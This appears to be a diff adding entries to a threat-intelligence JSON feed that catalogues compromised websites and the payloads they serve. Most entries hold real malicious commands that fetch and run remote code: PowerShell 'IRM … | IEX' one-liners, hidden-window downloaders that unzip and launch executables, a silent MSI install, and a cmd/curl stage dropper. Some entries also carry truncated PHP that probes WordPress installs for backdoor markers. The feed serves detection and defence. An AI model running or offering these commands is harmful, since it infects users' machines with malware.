+    "Payload": "$url = \"https://frclau[.]com/eoN\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"zN3HyHJT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
+    "ResolvedDownloadUrl": [
+      "https://frclau.com/eoN"
+    ],
+    "ReportId": "cmw90t1hq2gzd0oml24praadv"
+  },
+  {
+    "UrlDomain": "suppliermatchmaker.com",
+    "DeliveryUrl": [
+      "gl.githack.com"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "66.235.200.147"
+    ],
+    "Related": [],
+    "Payload": "IRM gl[.]githack[.]com/wiktor1992/53ffa7-d630-49af-a405-7e7278271132/-/raw/main/30-9434283BDFec | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gl.githack.com/wiktor1992/53ffa7-d630-49af-a405-7e7278271132/-/raw/main/30-9434283BDFec"
+    ],
+    "ReportId": "cmw90ru8s2gwt0omlb0su2tfo"
+  },
+  {
+    "UrlDomain": "aparweb.org",
+    "DeliveryUrl": [
+      "swingerwives.com"
+    ],
+    "PayloadUrl": [
+      "https://swingerwives.com"
+    ],
+    "IP": [
+      "139.59.25.194"
+    ],
+    "Related": [],
+    "Payload": "$t=$env:APPDATA+[char]92+\"n\";$z=$t+[char]92+\"n.zip\";New-Item -Path $t -ItemType Directory -Force|Out-Null;curl.exe -sL -o $z \"https://swingerwives[.]com\";tar.exe -xf $z -C $t;Remove-Item $z;$e=Get-ChildItem $t -Recurse -Filter \"Beautifull.exe\"|Select-Object -First 1;if($e){$w=[wmiclass]\"Win32_Process\";$w.Create($e.FullName)|Out-Null};exit",
+    "ResolvedDownloadUrl": [
+      "https://swingerwives.com"
+    ],
+    "ReportId": "cmw90qtm42gw00oml4gdndbs7"
+  },
+  {
+    "UrlDomain": "artimarket.sn",
+    "DeliveryUrl": [
+      "gl.githack.com"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "172.67.132.56"
+    ],
+    "Related": [],
+    "Payload": "IRM gl[.]githack[.]com/wiktor1992/53ffa7-d630-49af-a405-7e7278271132/-/raw/main/30-9434283BDFec | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gl.githack.com/wiktor1992/53ffa7-d630-49af-a405-7e7278271132/-/raw/main/30-9434283BDFec"
+    ],
+    "ReportId": "cmw90psqr2gr90omlmn8g35yw"
+  },
+  {
+    "UrlDomain": "abc-office.ch",
+    "DeliveryUrl": [
+      "physioga.net"
+    ],
+    "PayloadUrl": [
+      "https://physioga.net/u/stage1.cmd&%tmp%"
+    ],
+    "IP": [
+      "185.176.225.54"
+    ],
+    "Related": [],
+    "Payload": "cmd /c start /min cmd /c \"curl -sko %tmp%\\\\~u.cmd https://' + SCRIPTS_DOMAIN + '/u/stage1.cmd&%tmp%\\\\~u.cmd\"",
+    "ResolvedDownloadUrl": [],
+    "ReportId": "cmw90pri22gr50omlk7s7ymyl"
+  },
+  {
+    "UrlDomain": "dr-caviar.ch",
+    "DeliveryUrl": [
+      "physioga.net"
+    ],
+    "PayloadUrl": [
+      "https://physioga.net/u/stage1.cmd&%tmp%"
+    ],
+    "IP": [
+      "185.176.225.54"
+    ],
+    "Related": [],
+    "Payload": "cmd /c start /min cmd /c \"curl -sko %tmp%\\\\~u.cmd https:/",
+    "ResolvedDownloadUrl": [],
+    "ReportId": "cmw90phw62gp50omlrleqr8gj"
+  },
+  {
+    "UrlDomain": "sagaji.com.mx",
+    "DeliveryUrl": [
+      "softsyncizobrazie.net"
+    ],
+    "PayloadUrl": [
+      "http://softsyncizobrazie.net/x"
+    ],
+    "IP": [
+      "68.66.224.32"
+    ],
+    "Related": [],
+    "Payload": "$f=\"$env:TEMP\\$([guid]::NewGuid().ToString('N').Substring(0,10)).msi\";iwr \"http://softsyncizobrazie[.]net/x\" -OutFile $f -UseBasicParsing;cmd /c msiexec /i $f /qn;exit",
+    "ResolvedDownloadUrl": [
+      "http://softsyncizobrazie.net/x"
+    ],
+    "ReportId": "cmw90o6il2gli0omlwlr2xrzm"
+  },
+  {
+    "UrlDomain": "madeinyaman.com",
+    "DeliveryUrl": [
+      "polygon.therpc.io",
+      "polygon.rpc.hypersync.xyz",
+      "gl.githack.com"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "92.113.29.50"
+    ],
+    "Related": [],
+    "Payload": "IRM gl[.]githack[.]com/wiktor1992/53ffa7-d630-49af-a405-7e7278271132/-/raw/main/30-9434283BDFec | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gl.githack.com/wiktor1992/53ffa7-d630-49af-a405-7e7278271132/-/raw/main/30-9434283BDFec"
+    ],
+    "ReportId": "cmw90nxbn2gj40omlvjovqdns"
+  },
+  {
+    "UrlDomain": "blacktownfruitworld.com.au",
+    "DeliveryUrl": [
+      "t-trustresnew.com"
+    ],
+    "PayloadUrl": [
+      "https://t-trustresnew.com/Girya/76e5488361bd09f8"
+    ],
+    "IP": [
+      "103.224.90.151"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://t-trustresnew[.]com/Girya/76e5488361bd09f8')|iex",
+    "ResolvedDownloadUrl": [
+      "https://t-trustresnew.com/Girya/76e5488361bd09f8"
+    ],
+    "ReportId": "cmw90mp0b2ggo0omlygm6nltz"
+  },
+  {
+    "UrlDomain": "stories.xploraluxe.com",
+    "DeliveryUrl": [
+      "likingdropout.site",
+      "gl.githack.com"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "188.114.97.0"
+    ],
+    "Related": [],
+    "Payload": "$tok='7PZgwgZL1LNsnvea3SUiQ4H7io62jz6EwgOJ18FJVdQ';$id='3b7a320caafb1e3f';$interval=420; function _ea_inv($cfg){ $r=array('ts'=>time(),'wp'=>(function_exists('get_bloginfo')?get_bloginfo('version'):''),'php'=>PHP_VERSION); $chk=function($p,$m){$o=array('path'=>$p,'exists'=>false,'marker'=>false,'size'=>0);if(!$p||!is_string($p))return $o; if(@is_file($p)){$b=@file_get_contents($p);$o['exists']=true;$o['size']=strlen((string)$b);$o['marker']=($b&&strpos($b,$m)!==false);}return $o;}; $r['stub']=$chk($cfg['stub'],$cfg['ctrl']); $vis=array('plugin'=>null,'paths'=>array()); foreach($cfg['vis_paths'] as $_vp){$vis['paths'][]=$chk($_vp,$cfg['vis']);} $found=null;foreach($vis['paths'] as $_p){if(!empty($_p['marker'])){$found=$_p;break;}} if(!$found){$pd=WP_CONTENT_DIR.'/plugins';if(@is_dir($pd)){foreach(@glob($pd.'/*/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_plug')!==false){$found=$chk($_f,'// ea_plug');break;}}} $vis['plugin']=$found?:array('path'=>'','exists'=>false,'marker'=>false); $r['visitor']=$vis; $mu=array('path'=>'','exists'=>false,'marker'=>false);$md=WP_CONTENT_DIR.'/mu-plugins'; if(@is_dir($md)){foreach(@glob($md.'/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_mu')!==false){$mu=$chk($_f,'// ea_mu');break;}}} $r['mu_autologin']=$mu; $ft=0;$fw=0;$td=WP_CONTENT_DIR.'/themes';if(@is_dir($td)){foreach(@glob($td.'/*/functions.php')?:array() as $_f){$ft++;$b=@file_get_contents($_f);if($b&&strpos($b,'// _ea_al')!==false)$fw++;}} $r['functions_autologin']=array('themes_total'=>$ft,'themes_with_marker'=>$fw); $wpc=array('path'=>(defined('ABSPATH')?ABSPATH.'wp-config.php':''),'exists'=>false,'marker'=>false); if($wpc['path']&&@is_file($wpc['path'])){$b=@file_get_contents($wpc['path']);$wpc['exists']=true;$wpc['marker']=($b&&(",
+    "ResolvedDownloadUrl": [],
+    "ReportId": "cmw90lzhi2gek0omlejgd347c"
+  },
+  {
+    "UrlDomain": "universalwomensnetwork.com",
+    "DeliveryUrl": [
+      "frclau.com"
+    ],
+    "PayloadUrl": [
+      "https://frclau.com/eoN"
+    ],
+    "IP": [
+      "192.124.249.27"
+    ],
+    "Related": [],
+    "Payload": "$url = \"https://frclau[.]com/eoN\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"zN3HyHJT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
+    "ResolvedDownloadUrl": [
+      "https://frclau.com/eoN"
+    ],
+    "ReportId": "cmw90lnvw2ge50oml5qn3a4im"
+  },
+  {
+    "UrlDomain": "lortodiops.com",
+    "DeliveryUrl": [
+      "likingdropout.site",
+      "gl.githack.com"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "196.22.132.203"
+    ],
+    "Related": [],
+    "Payload": "$tok='rO-ylacrSAKpO7_kCE5dbfLPfeLYA3niCWjIcIoe1tQ';$id='1d8c241bd4bd770e';$interval=420; function _ea_inv($cfg){ $r=array('ts'=>time(),'wp'=>(function_exists('get_bloginfo')?get_bloginfo('version'):''),'php'=>PHP_VERSION); $chk=function($p,$m){$o=array('path'=>$p,'exists'=>false,'marker'=>false,'size'=>0);if(!$p||!is_string($p))return $o; if(@is_file($p)){$b=@file_get_contents($p);$o['exists']=true;$o['size']=strlen((string)$b);$o['marker']=($b&&strpos($b,$m)!==false);}return $o;}; $r['stub']=$chk($cfg['stub'],$cfg['ctrl']); $vis=array('plugin'=>null,'paths'=>array()); foreach($cfg['vis_paths'] as $_vp){$vis['paths'][]=$chk($_vp,$cfg['vis']);} $found=null;foreach($vis['paths'] as $_p){if(!empty($_p['marker'])){$found=$_p;break;}} if(!$found){$pd=WP_CONTENT_DIR.'/plugins';if(@is_dir($pd)){foreach(@glob($pd.'/*/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_plug')!==false){$found=$chk($_f,'// ea_plug');break;}}} $vis['plugin']=$found?:array('path'=>'','exists'=>false,'marker'=>false); $r['visitor']=$vis; $mu=array('path'=>'','exists'=>false,'marker'=>false);$md=WP_CONTENT_DIR.'/mu-plugins'; if(@is_dir($md)){foreach(@glob($md.'/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_mu')!==false){$mu=$chk($_f,'// ea_mu');break;}}} $r['mu_autologin']=$mu; $ft=0;$fw=0;$td=WP_CONTENT_DIR.'/themes';if(@is_dir($td)){foreach(@glob($td.'/*/functions.php')?:array() as $_f){$ft++;$b=@file_get_contents($_f);if($b&&strpos($b,'// _ea_al')!==false)$fw++;}} $r['functions_autologin']=array('themes_total'=>$ft,'themes_with_marker'=>$fw); $wpc=array('path'=>(defined('ABSPATH')?ABSPATH.'wp-config.php':''),'exists'=>false,'marker'=>false); if($wpc['path']&&@is_file($wpc['path'])){$b=@file_get_contents($wpc['path']);$wpc['exists']=true;$wpc['marker']=($b&&(",
+    "ResolvedDownloadUrl": [],
+    "ReportId": "cmw90kkhu2g8v0omlulfb5yc5"
+  },
+  {
+    "UrlDomain": "www.brainfuel.it",
+    "DeliveryUrl": [
+      "gl.githack.com"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "89.46.106.33"
+    ],
+    "Related": [],
+    "Payload": "IRM gl[.]githack[.]com/rytu08-74/cc2f-bf9b9-76a8-f5-a-0a43c2/-/raw/main/4-4dEA-d-b803 | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gl.githack.com/rytu08-74/cc2f-bf9b9-76a8-f5-a-0a43c2/-/raw/main/4-4dEA-d-b803"
+    ],
+    "ReportId": "cmw90k8752g7x0omllr8hm24r"
+  },
+  {
+    "UrlDomain": "circulodeoro.com",
+    "DeliveryUrl": [
+      "fastly.jsdelivr.net"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "185.42.104.33"
+    ],
+    "Related": [],
+    "Payload": "IRM fastly[.]jsdelivr[.]net/g\"h\"/wiktor1992kl/sds37465-df459-kcne8xhf-ajdf55/ea25409061fa | IEX",
+    "ResolvedDownloadUrl": [
+      "https://fastly.jsdelivr.net/gh/wiktor1992kl/sds37465-df459-kcne8xhf-ajdf55/ea25409061fa"
+    ],
+    "ReportId": "cmw90jwce2g580omlqquib5kq"
+  },
+  {
+    "UrlDomain": "www.lacenacoifiocchi.it",
+    "DeliveryUrl": [
+      "gl.githack.com"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "31.11.35.192"
+    ],
+    "Related": [
+      {
+        "Value": "https://www.instagram.com/glaucy_alves18/",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "IRM gl[.]githack[.]com/rytu08-74/cc2f-bf9b9-76a8-f5-a-0a43c2/-/raw/main/4-4dEA-d-b803 | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gl.githack.com/rytu08-74/cc2f-bf9b9-76a8-f5-a-0a43c2/-/raw/main/4-4dEA-d-b803"
+    ],
+    "ReportId": "cmw90d9wf2fnv0omlh0ro56h9"
+  },
+  {
+    "UrlDomain": "www.fondazioneannalisegalligani.it",
+    "DeliveryUrl": [
+      "gl.githack.com"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "89.46.108.6"
+    ],
+    "Related": [],
+    "Payload": "IRM gl[.]githack[.]com/rytu08-74/cc2f-bf9b9-76a8-f5-a-0a43c2/-/raw/main/4-4dEA-d-b803 | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gl.githack.com/rytu08-74/cc2f-bf9b9-76a8-f5-a-0a43c2/-/raw/main/4-4dEA-d-b803"
+    ],
+    "ReportId": "cmw9075rz2ffv0omle92mi0r6"
+  },
+  {
+    "UrlDomain": "www.vineblossom.it",
+    "DeliveryUrl": [
+      "gl.githack.com"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "89.46.106.84"
+    ],
+    "Related": [],
+    "Payload": "IRM gl[.]githack[.]com/rytu08-74/cc2f-bf9b9-76a8-f5-a-0a43c2/-/raw/main/4-4dEA-d-b803 | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gl.githack.com/rytu08-74/cc2f-bf9b9-76a8-f5-a-0a43c2/-/raw/main/4-4dEA-d-b803"
+    ],
+    "ReportId": "cmw9066h62f940omlsuogdxv0"
+  },
+  {
+    "UrlDomain": "www.itfimpianti.it",
+    "DeliveryUrl": [
+      "gl.githack.com"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "89.46.110.43"
+    ],
+    "Related": [],
+    "Payload": "IRM gl[.]githack[.]com/rytu08-74/cc2f-bf9b9-76a8-f5-a-0a43c2/-/raw/main/4-4dEA-d-b803 | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gl.githack.com/rytu08-74/cc2f-bf9b9-76a8-f5-a-0a43c2/-/raw/main/4-4dEA-d-b803"
+    ],
+    "ReportId": "cmw90327m2f1f0oml8topiw8u"
+  },
+  {
+    "UrlDomain": "bbcattedrale.it",
+    "DeliveryUrl": [
+      "gl.githack.com"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "185.205.40.169"
+    ],
+    "Related": [
+      {
+        "Value": "https://vk.com/club18658864",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "IRM gl[.]githack[.]com/rytu08-74/cc2f-bf9b9-76a8-f5-a-0a43c2/-/raw/main/4-4dEA-d-b803 | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gl.githack.com/rytu08-74/cc2f-bf9b9-76a8-f5-a-0a43c2/-/raw/main/4-4dEA-d-b803"
+    ],
+    "ReportId": "cmw901qmj2eww0omlyv8r3aem"
+  },
+  {
+    "UrlDomain": "kheradkimia.com",
+    "DeliveryUrl": [
+      "fastly.jsdelivr.net"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "5.144.130.40"
+    ],
+    "Related": [],
+    "Payload": "IRM fastly[.]jsdelivr[.]net/g\"h\"/wiktor1992kl/sds37465-df459-kcne8xhf-ajdf55/ea25409061fa | IEX",
+    "ResolvedDownloadUrl": [
+      "https://fastly.jsdelivr.net/gh/wiktor1992kl/sds37465-df459-kcne8xhf-ajdf55/ea25409061fa"
+    ],
+    "ReportId": "cmw8zvhj62ek90omlz9iz7aq5"
+  },
+  {
+    "UrlDomain": "dagoplast.cl",
+    "DeliveryUrl": [
+      "gl.githack.com"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "186.64.116.145"
+    ],
+    "Related": [],
+    "Payload": "IRM gl[.]githack[.]com/wiktor1992/53ffa7-d630-49af-a405-7e7278271132/-/raw/main/30-9434283BDFec | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gl.githack.com/wiktor1992/53ffa7-d630-49af-a405-7e7278271132/-/raw/main/30-9434283BDFec"
+    ],
+    "ReportId": "cmw8zv1co2eh90oml5giajyr8"
+  },
+  {
+    "UrlDomain": "kelmetna.org",
+    "DeliveryUrl": [
+      "gl.githack.com"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "162.241.24.143"
+    ],
+    "Related": [],
+    "Payload": "IRM gl[.]githack[.]com/wiktor1992/53ffa7-d630-49af-a405-7e7278271132/-/raw/main/30-9434283BDFec | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gl.githack.com/wiktor1992/53ffa7-d630-49af-a405-7e7278271132/-/raw/main/30-9434283BDFec"
+    ],
+    "ReportId": "cmw8zt11i2e8j0oml5shvppep"
+  },
+  {
+    "UrlDomain": "lawnspark.com",
+    "DeliveryUrl": [
+      "gl.githack.com"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "162.241.24.176"
+    ],
+    "Related": [],
+    "Payload": "IRM gl[.]githack[.]com/wiktor1992/53ffa7-d630-49af-a405-7e7278271132/-/raw/main/30-9434283BDFec | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gl.githack.com/wiktor1992/53ffa7-d630-49af-a405-7e7278271132/-/raw/main/30-9434283BDFec"
+    ],
+    "ReportId": "cmw8zcmd22dhd0omlkqw74qwr"
+  },
+  {
+    "UrlDomain": "www.france-opportunite.com",
+    "DeliveryUrl": [
+      "gl.githack.com"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "146.88.234.56"
+    ],
+    "Related": [],
+    "Payload": "IRM gl[.]githack[.]com/wiktor1992/53ffa7-d630-49af-a405-7e7278271132/-/raw/main/30-9434283BDFec | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gl.githack.com/wiktor1992/53ffa7-d630-49af-a405-7e7278271132/-/raw/main/30-9434283BDFec"
+    ],
+    "ReportId": "cmw8zbz8b2dg50oml7q26g1zm"
+  },
+  {
+    "UrlDomain": "macelleriapavese.it",
+    "DeliveryUrl": [
+      "gl.githack.com"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "31.14.141.98"
+    ],
+    "Related": [],
+    "Payload": "IRM gl[.]githack[.]com/rytu08-74/cc2f-bf9b9-76a8-f5-a-0a43c2/-/raw/main/4-4dEA-d-b803 | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gl.githack.com/rytu08-74/cc2f-bf9b9-76a8-f5-a-0a43c2/-/raw/main/4-4dEA-d-b803"
+    ],
+    "ReportId": "cmw8z92j32dcq0omlotl8zn2a"
+  },
+  {
+    "UrlDomain": "www.samsilverman.com",
+    "DeliveryUrl": [
+      "gl.githack.com"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "208.109.32.136"
+    ],
+    "Related": [],
+    "Payload": "IRM gl[.]githack[.]com/wiktor1992/53ffa7-d630-49af-a405-7e7278271132/-/raw/main/30-9434283BDFec | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gl.githack.com/wiktor1992/53ffa7-d630-49af-a405-7e7278271132/-/raw/main/30-9434283BDFec"
+    ],
+    "ReportId": "cmw8z84d52d9a0oml4nmy9cry"
+  },
+  {
+    "UrlDomain": "dhruveliladhar.com",
+    "DeliveryUrl": [
+      "gl.githack.com"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "204.11.59.190"
+    ],
+    "Related": [],
+    "Payload": "IRM gl[.]githack[.]com/wiktor1992/53ffa7-d630-49af-a405-7e7278271132/-/raw/main/30-9434283BDFec | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gl.githack.com/wiktor1992/53ffa7-d630-49af-a405-7e7278271132/-/raw/main/30-9434283BDFec"
+    ],
+    "ReportId": "cmw8z6xhd2d7c0omlrxlzh33l"
+  },
+  {
+    "UrlDomain": "www.hotelmarelen.gr",
+    "DeliveryUrl": [
+      "gl.githack.com"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "95.217.211.5"
+    ],
+    "Related": [],
+    "Payload": "IRM gl[.]githack[.]com/wiktor1992/53ffa7-d630-49af-a405-7e7278271132/-/raw/main/30-9434283BDFec | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gl.githack.com/wiktor1992/53ffa7-d630-49af-a405-7e7278271132/-/raw/main/30-9434283BDFec"
+    ],
+    "ReportId": "cmw8z6hjz2d210omlnmu6r7e4"
+  },
+  {
+    "UrlDomain": "www.khurmijewellers.com",
+    "DeliveryUrl": [
+      "gl.githack.com"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "162.241.169.234"
+    ],
+    "Related": [],
+    "Payload": "IRM gl[.]githack[.]com/wiktor1992/53ffa7-d630-49af-a405-7e7278271132/-/raw/main/30-9434283BDFec | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gl.githack.com/wiktor1992/53ffa7-d630-49af-a405-7e7278271132/-/raw/main/30-9434283BDFec"
+    ],
+    "ReportId": "cmw8z5j4b2d0w0omlqmb4dd6z"
+  },
+  {
+    "UrlDomain": "www.tennis-akademie-dessau.de",
+    "DeliveryUrl": [
+      "gl.githack.com"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "185.3.235.247"
+    ],
+    "Related": [],
+    "Payload": "IRM gl[.]githack[.]com/rytu08-74/cc2f-bf9b9-76a8-f5-a-0a43c2/-/raw/main/4-4dEA-d-b803 | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gl.githack.com/rytu08-74/cc2f-bf9b9-76a8-f5-a-0a43c2/-/raw/main/4-4dEA-d-b803"
+    ],
+    "ReportId": "cmw8z5fyz2d020omlblb8vv8g"
+  },
+  {
+    "UrlDomain": "www.esgtechnology.it",
+    "DeliveryUrl": [
+      "gl.githack.com"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "89.46.105.68"
+    ],
+    "Related": [],
+    "Payload": "IRM gl[.]githack[.]com/rytu08-74/cc2f-bf9b9-76a8-f5-a-0a43c2/-/raw/main/4-4dEA-d-b803 | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gl.githack.com/rytu08-74/cc2f-bf9b9-76a8-f5-a-0a43c2/-/raw/main/4-4dEA-d-b803"
+    ],
+    "ReportId": "cmw8z33pf2cv80omlgpyfcnwk"
+  },
+  {
+    "UrlDomain": "marcalvendeghaz.hu",
+    "DeliveryUrl": [
+      "fastly.jsdelivr.net"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "82.141.138.44"
+    ],
+    "Related": [],
+    "Payload": "IRM fastly[.]jsdelivr[.]net/g\"h\"/wiktor1992kl/sds37465-df459-kcne8xhf-ajdf55/ea25409061fa | IEX",
+    "ResolvedDownloadUrl": [
+      "https://fastly.jsdelivr.net/gh/wiktor1992kl/sds37465-df459-kcne8xhf-ajdf55/ea25409061fa"
+    ],
+    "ReportId": "cmw8ywl1j2clu0oml07xszzjx"
+  },
+  {
+    "UrlDomain": "www.femminerd.it",
+    "DeliveryUrl": [
+      "gl.githack.com"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "89.46.109.6"
+    ],
+    "Related": [],
+    "Payload": "IRM gl[.]githack[.]com/wiktor1992/53ffa7-d630-49af-a405-7e7278271132/-/raw/main/30-9434283BDFec | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gl.githack.com/wiktor1992/53ffa7-d630-49af-a405-7e7278271132/-/raw/main/30-9434283BDFec"
+    ],
+    "ReportId": "cmw8yqz9j2cbj0omlq452rd08"
+  },
+  {
+    "UrlDomain": "www.otticaimperatore.it",
+    "DeliveryUrl": [
+      "gl.githack.com"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "89.46.106.12"
+    ],
+    "Related": [],
+    "Payload": "IRM gl[.]githack[.]com/rytu08-74/cc2f-bf9b9-76a8-f5-a-0a43c2/-/raw/main/4-4dEA-d-b803 | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gl.githack.com/rytu08-74/cc2f-bf9b9-76a8-f5-a-0a43c2/-/raw/main/4-4dEA-d-b803"
+    ],
+    "ReportId": "cmw8yqyk92cbb0omlmvw70rw4"
+  },
+  {
+    "UrlDomain": "rosehardwareltd.co.ke",
+    "DeliveryUrl": [
+      "gl.githack.com"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "162.241.148.206"
+    ],
+    "Related": [],
+    "Payload": "IRM gl[.]githack[.]com/wiktor1992/53ffa7-d630-49af-a405-7e7278271132/-/raw/main/30-9434283BDFec | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gl.githack.com/wiktor1992/53ffa7-d630-49af-a405-7e7278271132/-/raw/main/30-9434283BDFec"
+    ],
+    "ReportId": "cmw8yom582c2k0omlw7ikx96r"
+  },
+  {
+    "UrlDomain": "sreevishal.com",
+    "DeliveryUrl": [
+      "gl.githack.com"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "162.214.80.52"
+    ],
+    "Related": [],
+    "Payload": "IRM gl[.]githack[.]com/wiktor1992/53ffa7-d630-49af-a405-7e7278271132/-/raw/main/30-9434283BDFec | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gl.githack.com/wiktor1992/53ffa7-d630-49af-a405-7e7278271132/-/raw/main/30-9434283BDFec"
+    ],
+    "ReportId": "cmw8yn9x42byq0oml02z6ylo6"
+  },
+  {
+    "UrlDomain": "thekratompark.com",
+    "DeliveryUrl": [
+      "likingdropout.site",
+      "gl.githack.com"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "50.87.178.48"
+    ],
+    "Related": [],
+    "Payload": "$tok='1dOSm3YdChejl5j3lx5LO8TZGE9OqmBuSFNpcLBa4vw';$id='1d26c482e27bbf2c';$interval=420; function _ea_inv($cfg){ $r=array('ts'=>time(),'wp'=>(function_exists('get_bloginfo')?get_bloginfo('version'):''),'php'=>PHP_VERSION); $chk=function($p,$m){$o=array('path'=>$p,'exists'=>false,'marker'=>false,'size'=>0);if(!$p||!is_string($p))return $o; if(@is_file($p)){$b=@file_get_contents($p);$o['exists']=true;$o['size']=strlen((string)$b);$o['marker']=($b&&strpos($b,$m)!==false);}return $o;}; $r['stub']=$chk($cfg['stub'],$cfg['ctrl']); $vis=array('plugin'=>null,'paths'=>array()); foreach($cfg['vis_paths'] as $_vp){$vis['paths'][]=$chk($_vp,$cfg['vis']);} $found=null;foreach($vis['paths'] as $_p){if(!empty($_p['marker'])){$found=$_p;break;}} if(!$found){$pd=WP_CONTENT_DIR.'/plugins';if(@is_dir($pd)){foreach(@glob($pd.'/*/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_plug')!==false){$found=$chk($_f,'// ea_plug');break;}}} $vis['plugin']=$found?:array('path'=>'','exists'=>false,'marker'=>false); $r['visitor']=$vis; $mu=array('path'=>'','exists'=>false,'marker'=>false);$md=WP_CONTENT_DIR.'/mu-plugins'; if(@is_dir($md)){foreach(@glob($md.'/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_mu')!==false){$mu=$chk($_f,'// ea_mu');break;}}} $r['mu_autologin']=$mu; $ft=0;$fw=0;$td=WP_CONTENT_DIR.'/themes';if(@is_dir($td)){foreach(@glob($td.'/*/functions.php')?:array() as $_f){$ft++;$b=@file_get_contents($_f);if($b&&strpos($b,'// _ea_al')!==false)$fw++;}} $r['functions_autologin']=array('themes_total'=>$ft,'themes_with_marker'=>$fw); $wpc=array('path'=>(defined('ABSPATH')?ABSPATH.'wp-config.php':''),'exists'=>false,'marker'=>false); if($wpc['path']&&@is_file($wpc['path'])){$b=@file_get_contents($wpc['path']);$wpc['exists']=true;$wpc['marker']=($b&&(",
+    "ResolvedDownloadUrl": [],
+    "ReportId": "cmw8ykws92bu50oml1000a28e"
+  },
+  {
+    "UrlDomain": "vijayahaardwares.com",
+    "DeliveryUrl": [
+      "gl.githack.com"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "43.225.55.237"
+    ],
+    "Related": [],
+    "Payload": "IRM gl[.]githack[.]com/wiktor1992/53ffa7-d630-49af-a405-7e7278271132/-/raw/main/30-9434283BDFec | IEX",
+    "ResolvedDownloadUrl": [
